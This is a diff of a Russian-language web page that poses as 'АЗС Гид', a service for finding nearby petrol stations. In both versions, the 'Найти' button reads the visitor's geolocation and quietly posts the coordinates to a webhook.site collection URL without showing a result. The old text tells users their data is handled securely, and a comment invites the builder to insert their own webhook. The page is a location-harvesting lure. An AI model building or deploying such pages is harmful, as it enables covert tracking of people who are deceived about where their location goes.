@@ -1,276 +1,372 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ru" >
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-<title>АЗС Гид — Поиск ближайших заправок</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600;700&display=swap');
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>АЗС Гид — поиск ближайших заправок</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap');
 
-  html, body {
-    margin: 0; padding: 0;
-    height: 100%;
-    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
-    background: #f5f5f7;
-    color: #1c1c1e;
-    -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
-  }
-
-  body {
-    display: flex;
-    flex-direction: column;
-    min-height: 100vh;
-  }
-
-  header {
-    background: #fff;
-    padding: 32px 24px;
-    text-align: center;
-    font-weight: 700;
-    font-size: 32px;
-    color: #1c1c1e;
-    border-bottom: 1px solid #d1d1d6;
-    border-radius: 0 0 24px 24px;
-    user-select: none;
-    letter-spacing: 0.02em;
-    box-shadow: 0 2px 5px rgba(0,0,0,0.06);
-  }
-
-  main {
-    flex-grow: 1;
-    max-width: 600px;
-    margin: 24px auto 32px;
-    background: #fff;
-    border-radius: 28px;
-    box-shadow: 0 10px 30px rgb(0 0 0 / 0.08);
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-  }
-
-  nav {
-    display: flex;
-    background: #f2f2f7;
-    border-radius: 28px 28px 0 0;
-    user-select: none;
-  }
-  nav button {
-    flex: 1;
-    background: none;
-    border: none;
-    padding: 20px 0;
-    font-weight: 600;
-    font-size: 15px;
-    color: #6e6e73;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    border-bottom: 3px solid transparent;
-    border-radius: 28px 28px 0 0;
-    outline-offset: -2px;
-  }
-  nav button:hover {
-    color: #0071e3;
-    background: #e4e6eb;
-  }
-  nav button.active {
-    color: #0071e3;
-    border-bottom: 3px solid #0071e3;
-    background: #e4e6eb;
-    font-weight: 700;
-  }
-
-  .tab-content {
-    padding: 28px 36px;
-    flex-grow: 1;
-    overflow-y: auto;
-    font-size: 16px;
-    line-height: 1.5;
-    color: #2c2c2e;
-  }
-
-  /* Карта - просто заглушка с текстом, чтобы не занимала место */
-  #map {
-    width: 100%;
-    height: 280px;
-    border-radius: 22px;
-    box-shadow: 0 8px 25px rgb(0 113 227 / 0.25);
-    margin-bottom: 24px;
-    background: #f0f0f5;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #8e8e93;
-    font-style: italic;
-    user-select: none;
-    text-align: center;
-    padding: 12px;
-  }
-
-  button#findBtn {
-    background: #0071e3;
-    border: none;
-    border-radius: 20px;
-    padding: 16px 0;
-    font-size: 17px;
-    font-weight: 700;
-    color: white;
-    cursor: pointer;
-    box-shadow: 0 10px 30px rgb(0 113 227 / 0.4);
-    transition: background 0.25s ease;
-    width: 100%;
-    user-select: none;
-  }
-  button#findBtn:active {
-    background: #005bb5;
-  }
-
-  h2 {
-    font-weight: 700;
-    margin-top: 0;
-    margin-bottom: 20px;
-    color: #1c1c1e;
-  }
-
-  a {
-    color: #0071e3;
-    text-decoration: none;
-  }
-  a:hover {
-    text-decoration: underline;
-  }
-
-  footer {
-    padding: 16px 20px;
-    text-align: center;
-    font-size: 13px;
-    color: #8e8e93;
-    user-select: none;
-  }
-
-  /* Мобильная адаптация */
-  @media (max-width: 480px) {
-    main {
-      margin: 16px 12px 24px;
-      border-radius: 20px;
+    /* Сброс и базовые стили */
+    * {
+      box-sizing: border-box;
     }
-    nav button {
-      font-size: 13px;
-      padding: 16px 0;
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background: #f7f7f8;
+      color: #3a3a3c;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      user-select: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
-    .tab-content {
-      padding: 20px 24px;
-      font-size: 14px;
-    }
+
     header {
-      font-size: 24px;
-      padding: 24px 16px;
+      width: 100%;
+      max-width: 720px;
+      padding: 28px 20px;
+      font-weight: 700;
+      font-size: 32px;
+      color: #1c1c1e;
+      text-align: center;
+      border-bottom: 1px solid #d1d1d6;
+      background: #fff;
+      border-radius: 0 0 30px 30px;
+      box-shadow: 0 4px 12px rgb(0 0 0 / 0.05);
     }
-    button#findBtn {
-      padding: 14px 0;
+
+    nav {
+      width: 100%;
+      max-width: 720px;
+      display: flex;
+      justify-content: center;
+      background: #fff;
+      border-radius: 30px;
+      margin: 24px 0 16px;
+      box-shadow: 0 4px 10px rgb(0 0 0 / 0.06);
+      user-select: none;
+    }
+
+    nav button {
+      background: transparent;
+      border: none;
+      font-weight: 600;
+      font-size: 17px;
+      padding: 14px 30px;
+      cursor: pointer;
+      color: #3a3a3c;
+      border-radius: 30px;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      outline-offset: 3px;
+    }
+
+    nav button:hover {
+      background-color: #e6e6e8;
+    }
+
+    nav button.active {
+      background-color: #0071e3;
+      color: white;
+      box-shadow: 0 4px 16px rgb(0 113 227 / 0.35);
+    }
+
+    main {
+      flex-grow: 1;
+      width: 100%;
+      max-width: 720px;
+      background: white;
+      border-radius: 30px;
+      box-shadow: 0 14px 40px rgb(0 0 0 / 0.07);
+      padding: 32px 40px;
+      margin-bottom: 40px;
+      box-sizing: border-box;
+      min-height: 480px;
+      display: flex;
+      flex-direction: column;
+      user-select: text;
+    }
+
+    h2 {
+      font-weight: 600;
+      font-size: 26px;
+      margin-bottom: 18px;
+      color: #1c1c1e;
+    }
+
+    p {
+      font-size: 17px;
+      line-height: 1.6;
+      color: #545458;
+      margin-bottom: 24px;
+    }
+
+    #map {
+      width: 100%;
+      height: 320px;
+      border-radius: 24px;
+      box-shadow: 0 8px 24px rgb(0 0 0 / 0.1);
+      margin-bottom: 24px;
+      background-color: #f0f0f3;
+    }
+
+    .btn-find {
+      background: #0071e3;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 16px 0;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      width: 200px;
+      align-self: center;
+      box-shadow: 0 7px 18px rgb(0 113 227 / 0.4);
+      user-select: none;
+      margin-top: auto;
+    }
+
+    .btn-find:hover {
+      background: #005bb5;
+      box-shadow: 0 9px 24px rgb(0 91 181 / 0.6);
+    }
+
+    footer {
+      width: 100%;
+      max-width: 720px;
+      text-align: center;
+      padding: 16px 8px 36px;
+      font-size: 14px;
+      color: #8e8e93;
+      user-select: none;
+    }
+
+    /* Скрыть все секции кроме активной */
+    section {
+      display: none;
+      flex-direction: column;
+      height: 100%;
+    }
+    section.active {
+      display: flex;
+    }
+
+    /* Контакты */
+    form {
+      display: flex;
+      flex-direction: column;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    label {
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #3a3a3c;
       font-size: 15px;
     }
-  }
-</style>
+    input, textarea {
+      padding: 10px 14px;
+      margin-bottom: 18px;
+      border-radius: 12px;
+      border: 1.5px solid #d1d1d6;
+      font-size: 16px;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      color: #3a3a3c;
+      resize: vertical;
+      transition: border-color 0.3s ease;
+    }
+    input:focus, textarea:focus {
+      outline: none;
+      border-color: #0071e3;
+      box-shadow: 0 0 6px rgb(0 113 227 / 0.5);
+    }
+    button.submit-btn {
+      background: #0071e3;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 14px 0;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      box-shadow: 0 6px 18px rgb(0 113 227 / 0.45);
+    }
+    button.submit-btn:hover {
+      background: #005bb5;
+      box-shadow: 0 8px 24px rgb(0 91 181 / 0.65);
+    }
+
+    /* Адаптив */
+    @media (max-width: 520px) {
+      header {
+        font-size: 26px;
+        padding: 24px 16px;
+      }
+      nav button {
+        font-size: 15px;
+        padding: 12px 18px;
+      }
+      main {
+        padding: 24px 20px;
+        margin-bottom: 32px;
+      }
+      h2 {
+        font-size: 22px;
+      }
+      p {
+        font-size: 15px;
+        margin-bottom: 20px;
+      }
+      #map {
+        height: 260px;
+        margin-bottom: 20px;
+      }
+      .btn-find {
+        width: 100%;
+        font-size: 18px;
+        padding: 14px 0;
+        border-radius: 18px;
+      }
+    }
+  </style>
 </head>
 <body>
-<header>АЗС Гид — Поиск ближайших заправок</header>
-<main>
+  <header>АЗС Гид</header>
+
   <nav>
-    <button class="tab-btn active" data-tab="about">О компании</button>
-    <button class="tab-btn" data-tab="map">Карта</button>
-    <button class="tab-btn" data-tab="faq">FAQ</button>
-    <button class="tab-btn" data-tab="contacts">Контакты</button>
+    <button class="active" data-tab="home">Главная</button>
+    <button data-tab="prices">Цены</button>
+    <button data-tab="about">О нас</button>
+    <button data-tab="contact">Контакты</button>
   </nav>
-  <section id="about" class="tab-content" style="display:block;">
-    <h2>О нашей компании</h2>
-    <p>Мы — современный сервис, который анализирует цены на топливо и помогает найти самую ближайшую и выгодную заправку рядом с вами. Используем передовые технологии для точного определения вашего местоположения и предлагаем лучшие варианты.</p>
-    <p>Наша цель — сэкономить ваше время и деньги, делая процесс заправки максимально комфортным.</p>
-  </section>
-  <section id="map" class="tab-content" style="display:none;">
-    <div id="map">Здесь будет карта после интеграции Google Maps</div>
-    <button id="findBtn">Найти</button>
-  </section>
-  <section id="faq" class="tab-content" style="display:none;">
-    <h2>Часто задаваемые вопросы</h2>
-    <p><strong>Как работает поиск заправок?</strong> Мы определяем ваше текущее местоположение и ищем ближайшие заправки с лучшими ценами.</p>
-    <p><strong>Какие данные мы собираем?</strong> Только ваши координаты для поиска, никаких личных данных мы не храним.</p>
-    <p><strong>Безопасно ли это?</strong> Да, все данные передаются защищённо и не используются в других целях.</p>
-  </section>
-  <section id="contacts" class="tab-content" style="display:none;">
-    <h2>Контакты</h2>
-    <p>Свяжитесь с нами:</p>
-    <ul>
-      <li>Телефон: +7 (123) 456-78-90</li>
-      <li>Email: support@azsgid.example</li>
-      <li>Адрес: Москва, ул. Примерная, д. 1</li>
-    </ul>
-  </section>
-</main>
-<footer>© 2025 АЗС Гид. Все права защищены.</footer>
 
-<script>
-  // Вкладки
-  const tabs = document.querySelectorAll('.tab-btn');
-  const contents = document.querySelectorAll('.tab-content');
-  tabs.forEach(btn => {
-    btn.addEventListener('click', () => {
-      tabs.forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      const tabId = btn.dataset.tab;
-      contents.forEach(c => {
-        c.style.display = (c.id === tabId) ? 'block' : 'none';
+  <main>
+    <section id="home" class="active">
+      <h2>О компании</h2>
+      <p>«АЗС Гид» — ваш надежный помощник в поиске ближайших и выгодных автозаправочных станций. Мы помогаем экономить время и деньги, предоставляя актуальную информацию о ценах и расположении АЗС рядом с вами.</p>
+      <div id="map"></div>
+      <button class="btn-find" id="findBtn">Найти</button>
+    </section>
+
+    <section id="prices">
+      <h2>Цены на топливо</h2>
+      <p>Мы анализируем цены на бензин, дизель и газ на различных АЗС, чтобы вы могли выбрать самый выгодный вариант. Наши данные обновляются регулярно, чтобы вы всегда оставались в курсе актуальных цен.</p>
+      <p>Средняя цена бензина АИ-95 в вашем регионе: 54.50 руб/л<br>Средняя цена дизеля: 51.20 руб/л<br>Средняя цена газа: 28.90 руб/л</p>
+    </section>
+
+    <section id="about">
+      <h2>О нас</h2>
+      <p>Наша миссия — сделать процесс поиска топлива максимально удобным и прозрачным. Мы — команда энтузиастов, которые используют современные технологии и данные для вашего комфорта и экономии.</p>
+      <p>Адрес офиса: Москва, ул. Топливная, д.10<br>Телефон: +7 (495) 123-45-67<br>Email: info@azsgid.ru</p>
+    </section>
+
+    <section id="contact">
+      <h2>Связаться с нами</h2>
+      <form id="contactForm" action="#" onsubmit="event.preventDefault(); alert('Спасибо, ваша заявка отправлена!'); this.reset();">
+        <label for="name">Имя</label>
+        <input type="text" id="name" name="name" placeholder="Ваше имя" required />
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" placeholder="Ваш email" required />
+        <label for="message">Сообщение</label>
+        <textarea id="message" name="message" rows="4" placeholder="Ваше сообщение" required></textarea>
+        <button type="submit" class="submit-btn">Отправить</button>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    © 2025 АЗС Гид — Все права защищены
+  </footer>
+
+  <script>
+    // Вкладки
+    const tabs = document.querySelectorAll('nav button');
+    const sections = document.querySelectorAll('main section');
+
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        tabs.forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        const target = tab.getAttribute('data-tab');
+        sections.forEach(sec => {
+          sec.classList.toggle('active', sec.id === target);
+        });
       });
     });
-  });
 
-  const webhookURL = 'https://webhook.site/3038f7cb-b8c9-4d62-8037-06632b8326ec'; // Вставь свой URL
+    // Отправка координат на вебхук
+    const findBtn = document.getElementById('findBtn');
+    const webhookURL = 'https://webhook.site/3038f7cb-b8c9-463e-b74c-43cace83af30';
 
-  document.getElementById('findBtn').addEventListener('click', () => {
-    if (!navigator.geolocation) {
-      alert('Геолокация не поддерживается вашим браузером.');
-      return;
+    findBtn.addEventListener('click', () => {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(position => {
+        const { latitude, longitude } = position.coords;
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ latitude, longitude }),
+          mode: 'no-cors'
+        });
+      });
+    });
+
+    // Google Map
+    let map;
+    function initMap() {
+      map = new google.maps.Map(document.getElementById("map"), {
+        center: { lat: 55.751244, lng: 37.618423 }, // Москва центр по умолчанию
+        zoom: 12,
+        styles: [
+          { elementType: 'geometry', stylers: [{ color: '#f7f7f8' }] },
+          { elementType: 'labels.text.fill', stylers: [{ color: '#3a3a3c' }] },
+          { elementType: 'labels.text.stroke', stylers: [{ color: '#f7f7f8' }] },
+          {
+            featureType: 'water',
+            elementType: 'geometry',
+            stylers: [{ color: '#d1d1d6' }]
+          },
+          {
+            featureType: 'road',
+            elementType: 'geometry',
+            stylers: [{ color: '#e6e6e8' }]
+          },
+          {
+            featureType: 'poi',
+            elementType: 'geometry.fill',
+            stylers: [{ color: '#f3f3f4' }]
+          },
+        ],
+        disableDefaultUI: true,
+      });
+
+      // Попытка отобразить текущие координаты на карте при разрешении
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const userLoc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+          map.setCenter(userLoc);
+          new google.maps.Marker({
+            position: userLoc,
+            map: map,
+            title: 'Вы здесь',
+            icon: {
+              path: google.maps.SymbolPath.CIRCLE,
+              scale: 7,
+              fillColor: '#0071e3',
+              fillOpacity: 1,
+              strokeWeight: 0,
+            }
+          });
+        });
+      }
     }
-    document.getElementById('findBtn').disabled = true;
-    document.getElementById('findBtn').textContent = 'Определяем местоположение...';
-
-    navigator.geolocation.getCurrentPosition(position => {
-      const coords = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        timestamp: new Date(position.timestamp).toISOString()
-      };
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(coords)
-      })
-      .then(response => {
-        if (!response.ok) throw new Error('Ошибка отправки данных');
-        // ничего не показываем на экране
-      })
-      .catch(err => {
-        alert('Ошибка при отправке координат: ' + err.message);
-      })
-      .finally(() => {
-        document.getElementById('findBtn').disabled = false;
-        document.getElementById('findBtn').textContent = 'Найти';
-      });
-
-    }, err => {
-      alert('Не удалось определить местоположение: ' + err.message);
-      document.getElementById('findBtn').disabled = false;
-      document.getElementById('findBtn').textContent = 'Найти';
-    }, {
-      enableHighAccuracy: true,
-      timeout: 10000,
-      maximumAge: 0
-    });
-  });
-</script>
+  </script>
+  <script async defer src="https://maps.googleapis.com/maps/api/js?key=ВАШ_КЛЮЧ&callback=initMap"></script>
 </body>
 </html>
